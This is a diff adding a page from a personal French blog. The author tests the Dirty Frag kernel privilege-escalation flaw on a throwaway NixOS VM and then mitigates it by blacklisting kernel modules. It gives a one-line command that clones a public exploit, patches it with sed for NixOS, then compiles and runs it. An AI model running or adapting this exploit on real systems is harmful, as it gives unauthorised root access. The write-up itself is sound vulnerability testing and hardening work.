@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>La page de David</title>
+  <link rel="stylesheet" href="/index.css">
+  
+  
+    <link rel="alternate" type="application/rss+xml" title="RSS" href="https://adavida.github.io/rss.xml">
+  
+</head>
+
+<body>
+  <a href="#main-content" class="skip-link">Aller au contenu principal</a>
+  <header>
+    <a href="https:&#x2F;&#x2F;adavida.github.io&#x2F;" class="site-title">La page de David</a>
+  </header>
+
+  <main>
+    <nav class="sidebar" aria-label="Menu principal">
+      <ul class="sidebar-nav">
+      
+        
+          
+            
+            
+              <li>Configuration de mon nas
+                <ul>
+                  
+                    <li class="">
+                      <a href="https:&#x2F;&#x2F;adavida.github.io&#x2F;articles&#x2F;000_nas&#x2F;000-my-new-nas&#x2F;">Présentation de mon nouveau NAS</a>
+                    </li>
+                  
+                    <li class="">
+                      <a href="https:&#x2F;&#x2F;adavida.github.io&#x2F;articles&#x2F;000_nas&#x2F;010-install-test-vm&#x2F;">Installation d&#x27;une machine virtuel pour tester</a>
+                    </li>
+                  
+                    <li class="">
+                      <a href="https:&#x2F;&#x2F;adavida.github.io&#x2F;articles&#x2F;000_nas&#x2F;030-coredns&#x2F;">Installation de CoreDNS</a>
+                    </li>
+                  
+                    <li class="">
+                      <a href="https:&#x2F;&#x2F;adavida.github.io&#x2F;articles&#x2F;000_nas&#x2F;040-openldap&#x2F;">Installation de OpenLDAP</a>
+                    </li>
+                  
+                </ul>
+              </li>
+            
+          
+            
+            
+              <li>Sécurité
+                <ul>
+                  
+                    <li class="current">
+                      <a href="https:&#x2F;&#x2F;adavida.github.io&#x2F;articles&#x2F;010_security&#x2F;000-dirtyfrag&#x2F;">Le faille Dirty Frag et NixOS </a>
+                    </li>
+                  
+                </ul>
+              </li>
+            
+          
+        
+      </ul>
+    </nav>
+
+    <div class="content" id="main-content">
+      
+<article>
+  <header class="article-header">
+    <h1>Le faille Dirty Frag et NixOS </h1>
+  </header>
+  
+  <div class="article-content">
+    <h2 id="la-faille">La faille</h2>
+<p>Jeudi 7 mai 2026 une faille Zeros day, nommée Dirty Frag (CVE-2026-43284 et CVE-2026-43500), a été publié. <a rel="external" href="https://github.com/V4bel/dirtyfrag/blob/master/README.md">Un poc est disponible ici.</a></p>
+<p>Ma NixOS est-elle vulnérable ?</p>
+<p>Je ne souhaite pas tester sur mon pc, je vais utiliser une VM.</p>
+<p>Pour commencer, je crée un fichier <code>flake.nix</code> dans un répertoire vide :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="nix"><span class="giallo-l"><span>{</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">  inputs</span><span>.</span><span style="color: #6F42C1;">nixpkgs</span><span>.</span><span style="color: #6F42C1;">url</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;github:NixOS/nixpkgs/nixos-unstable&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6A737D;">  # pour tester sur NixOS 25.11 on utilise cette ligne à la place :</span></span>
+<span class="giallo-l"><span style="color: #6A737D;">  # inputs.nixpkgs.url = &quot;github:NixOS/nixpkgs/nixos-25.11&quot;;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;">  outputs</span><span style="color: #D73A49;"> =</span></span>
+<span class="giallo-l"><span>    { self</span><span style="color: #D73A49;">,</span><span> nixpkgs</span><span style="color: #D73A49;">, ...</span><span> }@inputs:</span></span>
+<span class="giallo-l"><span style="color: #D73A49;">    let</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">      system</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;x86_64-linux&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #D73A49;">    in</span></span>
+<span class="giallo-l"><span>    {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">      nixosConfigurations</span><span>.</span><span style="color: #6F42C1;">test</span><span style="color: #D73A49;"> =</span><span style="color: #E36209;"> nixpkgs</span><span style="color: #D73A49;">.</span><span style="color: #E36209;">lib</span><span style="color: #D73A49;">.</span><span style="color: #E36209;">nixosSystem</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #D73A49;">        inherit</span><span style="color: #6F42C1;"> system</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">        modules</span><span style="color: #D73A49;"> =</span><span> [</span></span>
+<span class="giallo-l"><span style="color: #032F62;">          ./configuration.nix</span></span>
+<span class="giallo-l"><span>        ];</span></span>
+<span class="giallo-l"><span>      };</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">      apps</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span>        ${</span><span style="color: #E36209;">system</span><span>}.</span><span style="color: #6F42C1;">default</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">          type</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;app&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">          program</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;${</span><span style="color: #005CC5;">inputs</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">self</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">nixosConfigurations</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">test</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">config</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">system</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">build</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">vm</span><span style="color: #032F62;">}/bin/run-nixos-vm&quot;</span><span>;</span></span>
+<span class="giallo-l"><span>        };</span></span>
+<span class="giallo-l"><span>      };</span></span>
+<span class="giallo-l"><span>    };</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
+<p>et un fichier <code>configuration.nix</code> :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="nix"><span class="giallo-l"><span>{</span></span>
+<span class="giallo-l"><span> pkgs</span><span style="color: #D73A49;">,</span></span>
+<span class="giallo-l"><span style="color: #D73A49;"> ...</span></span>
+<span class="giallo-l"><span>}:</span></span>
+<span class="giallo-l"><span>{</span></span>
+<span class="giallo-l"><span style="color: #6A737D;"> # décommmanter cette ligne pour avoire le linux 6.18</span></span>
+<span class="giallo-l"><span style="color: #6A737D;"> # boot.kernelPackages = pkgs.linuxPackages_6_18;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> users</span><span>.</span><span style="color: #6F42C1;">groups</span><span>.</span><span style="color: #6F42C1;">admin</span><span style="color: #D73A49;"> =</span><span> { };</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> users</span><span>.</span><span style="color: #6F42C1;">users</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">   admin</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">     isNormalUser</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> true</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">     extraGroups</span><span style="color: #D73A49;"> =</span><span> [</span><span style="color: #032F62;"> &quot;wheel&quot;</span><span> ];</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">     password</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;admin&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">     group</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;admin&quot;</span><span>;</span></span>
+<span class="giallo-l"><span>   };</span></span>
+<span class="giallo-l"><span> };</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> security</span><span>.</span><span style="color: #6F42C1;">sudo</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">   wheelNeedsPassword</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> false</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">   execWheelOnly</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> true</span><span>;</span></span>
+<span class="giallo-l"><span> };</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> virtualisation</span><span>.</span><span style="color: #6F42C1;">vmVariant</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">   virtualisation</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">     memorySize</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> 2048</span><span>;</span><span style="color: #6A737D;"> # Use 2048MiB memory.</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">     cores</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> 4</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">     graphics</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> false</span><span>;</span></span>
+<span class="giallo-l"><span>   };</span></span>
+<span class="giallo-l"><span> };</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> nixpkgs</span><span>.</span><span style="color: #6F42C1;">config</span><span>.</span><span style="color: #6F42C1;">allowUnfree</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> true</span><span>;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> services</span><span>.</span><span style="color: #6F42C1;">openssh</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">   enable</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> true</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">   settings</span><span>.</span><span style="color: #6F42C1;">PasswordAuthentication</span><span style="color: #D73A49;"> =</span><span style="color: #005CC5;"> true</span><span>;</span></span>
+<span class="giallo-l"><span> };</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> networking</span><span>.</span><span style="color: #6F42C1;">firewall</span><span>.</span><span style="color: #6F42C1;">allowedTCPPorts</span><span style="color: #D73A49;"> =</span><span> [</span><span style="color: #005CC5;"> 22</span><span> ];</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> environment</span><span>.</span><span style="color: #6F42C1;">systemPackages</span><span style="color: #D73A49;"> = with</span><span style="color: #E36209;"> pkgs</span><span>; [</span></span>
+<span class="giallo-l"><span style="color: #E36209;">   cmake</span></span>
+<span class="giallo-l"><span style="color: #E36209;">   git</span></span>
+<span class="giallo-l"><span style="color: #E36209;">   gcc</span></span>
+<span class="giallo-l"><span> ];</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;"> system</span><span>.</span><span style="color: #6F42C1;">stateVersion</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;26.05&quot;</span><span>;</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
+<p>Je lance <code>nix run</code> cela crée et lance la VM.
+Je me connecte avec le login "admin" et le mot de pass "admin".</p>
+<p>Puis, je teste l'exploit avec :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6F42C1;">git</span><span style="color: #032F62;"> clone https://github.com/V4bel/dirtyfrag.git</span><span> &amp;&amp;</span><span style="color: #005CC5;"> cd</span><span style="color: #032F62;"> dirtyfrag</span><span> &amp;&amp;</span><span style="color: #6F42C1;"> gcc</span><span style="color: #005CC5;"> -O0 -Wall -o</span><span style="color: #032F62;"> exp exp.c</span><span style="color: #005CC5;"> -lutil</span><span> &amp;&amp;</span><span style="color: #6F42C1;"> ./exp</span></span></code></pre>
+<p><img src="https://adavida.github.io/articles/010_security/000-dirtyfrag/00.png" alt="console poc not work" /></p>
+<p>Et cela ne marche pas. On est safe ? Non ici le problème, est que NixOS <code>su</code> n'est pas dans <code>/usr/bin/su</code> mais <code>/run/current-system/sw/bin/su</code>.</p>
+<p>Je modifie le fichier avec :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6F42C1;">sed</span><span style="color: #005CC5;"> -i</span><span style="color: #032F62;"> &#39;s|/usr/bin/su|/run/current-system/sw/bin/su|g&#39; exp.c</span></span></code></pre>
+<p>Je rebuild et je teste :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6F42C1;">gcc</span><span style="color: #005CC5;"> -O0 -Wall -o</span><span style="color: #032F62;"> exp exp.c</span><span style="color: #005CC5;"> -lutil</span><span> &amp;&amp;</span><span style="color: #6F42C1;"> ./exp</span></span></code></pre>
+<p><img src="https://adavida.github.io/articles/010_security/000-dirtyfrag/01.png" alt="console fail poc ok" /></p>
+<p>Et bin cela passe.</p>
+<p>En une ligne :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6F42C1;">git</span><span style="color: #032F62;"> clone https://github.com/V4bel/dirtyfrag.git</span><span> &amp;&amp;</span><span style="color: #005CC5;"> cd</span><span style="color: #032F62;"> dirtyfrag</span><span> &amp;&amp;</span><span style="color: #6F42C1;"> sed</span><span style="color: #005CC5;"> -i</span><span style="color: #032F62;"> &#39;s|/usr/bin/su|/run/current-system/sw/bin/su|g&#39; exp.c</span><span> &amp;&amp;</span><span style="color: #6F42C1;"> gcc</span><span style="color: #005CC5;"> -O0 -Wall -o</span><span style="color: #032F62;"> exp exp.c</span><span style="color: #005CC5;"> -lutil</span><span> &amp;&amp;</span><span style="color: #6F42C1;"> ./exp</span></span></code></pre>
+<p>Pour arrêter la VM :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6F42C1;">sudo</span><span style="color: #032F62;"> halt</span><span style="color: #005CC5;"> -p</span></span></code></pre><h2 id="attenuation">Atténuation</h2>
+<p>Dans le poc il nous donne cette commande, pour atténuer la faille :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6F42C1;">sh</span><span style="color: #005CC5;"> -c</span><span style="color: #032F62;"> &quot;printf &#39;install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n&#39; &gt; /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2&gt;/dev/null; echo 3 &gt; /proc/sys/vm/drop_caches; true&quot;</span></span></code></pre>
+<p>Pour atténuer la faille, cela ne devrait pas marcher sur NixOS.</p>
+<p>À la place à côté de mon flake.nix, je crée un fichier <code>mitigation.nix</code> :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="nix"><span class="giallo-l"><span>{</span></span>
+<span class="giallo-l"><span>  config</span><span style="color: #D73A49;">,</span></span>
+<span class="giallo-l"><span style="color: #D73A49;">  ...</span></span>
+<span class="giallo-l"><span>}: {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">  boot</span><span>.</span><span style="color: #6F42C1;">blacklistedKernelModules</span><span style="color: #D73A49;"> =</span><span> [</span><span style="color: #032F62;"> &quot;esp4&quot; &quot;esp6&quot; &quot;rxrpc&quot;</span><span> ];</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;">    environment</span><span>.</span><span style="color: #6F42C1;">etc</span><span>.</span><span style="color: #032F62;">&quot;modprobe.d/dirtyfrag.conf&quot;</span><span>.</span><span style="color: #6F42C1;">text</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &#39;&#39;</span></span>
+<span class="giallo-l"><span style="color: #032F62;">      install esp4 /run/current-system/sw/bin/false</span></span>
+<span class="giallo-l"><span style="color: #032F62;">      install esp6 /run/current-system/sw/bin/false</span></span>
+<span class="giallo-l"><span style="color: #032F62;">      install rxrpc /run/current-system/sw/bin/false</span></span>
+<span class="giallo-l"><span style="color: #032F62;">  &#39;&#39;</span><span>;</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
+<p>Je modifie le fichier <code>flake.nix</code> :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="nix"><span class="giallo-l"><span>{</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">  inputs</span><span>.</span><span style="color: #6F42C1;">nixpkgs</span><span>.</span><span style="color: #6F42C1;">url</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;github:NixOS/nixpkgs/nixos-unstable&quot;</span><span>;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6F42C1;">  outputs</span><span style="color: #D73A49;"> =</span></span>
+<span class="giallo-l"><span>    { self</span><span style="color: #D73A49;">,</span><span> nixpkgs</span><span style="color: #D73A49;">, ...</span><span> }@inputs:</span></span>
+<span class="giallo-l"><span style="color: #D73A49;">    let</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">      system</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;x86_64-linux&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #D73A49;">    in</span></span>
+<span class="giallo-l"><span>    {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">      formatter</span><span>.${</span><span style="color: #E36209;">system</span><span>}</span><span style="color: #D73A49;"> =</span><span style="color: #E36209;"> nixpkgs</span><span style="color: #D73A49;">.</span><span style="color: #E36209;">legacyPackages</span><span style="color: #D73A49;">.</span><span>${</span><span style="color: #E36209;">system</span><span>}</span><span style="color: #D73A49;">.</span><span style="color: #E36209;">nixfmt-tree</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">      nixosConfigurations</span><span>.</span><span style="color: #6F42C1;">test</span><span style="color: #D73A49;"> =</span><span style="color: #E36209;"> nixpkgs</span><span style="color: #D73A49;">.</span><span style="color: #E36209;">lib</span><span style="color: #D73A49;">.</span><span style="color: #E36209;">nixosSystem</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #D73A49;">        inherit</span><span style="color: #6F42C1;"> system</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">        modules</span><span style="color: #D73A49;"> =</span><span> [</span></span>
+<span class="giallo-l"><span style="color: #032F62;">          ./configuration.nix</span></span>
+<span class="giallo-l"><span style="color: #032F62;">          ./mitigation.nix</span><span style="color: #6A737D;"> # ajoute cette ligne.</span></span>
+<span class="giallo-l"><span>        ];</span></span>
+<span class="giallo-l"><span>      };</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">      apps</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span>        ${</span><span style="color: #E36209;">system</span><span>}.</span><span style="color: #6F42C1;">default</span><span style="color: #D73A49;"> =</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">          type</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;app&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6F42C1;">          program</span><span style="color: #D73A49;"> =</span><span style="color: #032F62;"> &quot;${</span><span style="color: #005CC5;">inputs</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">self</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">nixosConfigurations</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">test</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">config</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">system</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">build</span><span style="color: #D73A49;">.</span><span style="color: #005CC5;">vm</span><span style="color: #032F62;">}/bin/run-nixos-vm&quot;</span><span>;</span></span>
+<span class="giallo-l"><span>        };</span></span>
+<span class="giallo-l"><span>      };</span></span>
+<span class="giallo-l"><span>    };</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
+<p>Je lance la VM <code>nix run</code>.</p>
+<p>On teste :</p>
+<pre class="giallo" style="color: #24292E; background-color: #FFFFFF;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #005CC5;">cd</span><span style="color: #032F62;"> dirtyfrag/</span><span>;</span><span style="color: #6F42C1;"> ./exp</span></span></code></pre>
+<p><img src="https://adavida.github.io/articles/010_security/000-dirtyfrag/02.png" alt="mitigation" /></p>
+<p>Ici, j'ai relancé la VM donc pas besoin de décharger les modules du noyau avec : <code>rmmod esp4 esp6 rxrpc 2&gt;/dev/null</code> ni de reset le page cache avec : <code>echo 3 &gt; /proc/sys/vm/drop_caches</code>.</p>
+
+  </div>
+</article>
+
+
+
+<nav class="section-pages">
+  <h4>Sécurité:</h4>
+  <ul>
+    
+      
+        
+          
+      <li class="current">
+        <a href="https:&#x2F;&#x2F;adavida.github.io&#x2F;articles&#x2F;010_security&#x2F;000-dirtyfrag&#x2F;">Le faille Dirty Frag et NixOS </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+    </div>
+  </main>
+  
+  <footer>
+    <div class="footer-about">
+      <p>Blog personnel sur mes tribulations personnelles sur le développement, Linux, et auto-hébergement.</p>
+    </div>
+  </footer>
+</body>
+
+</html>
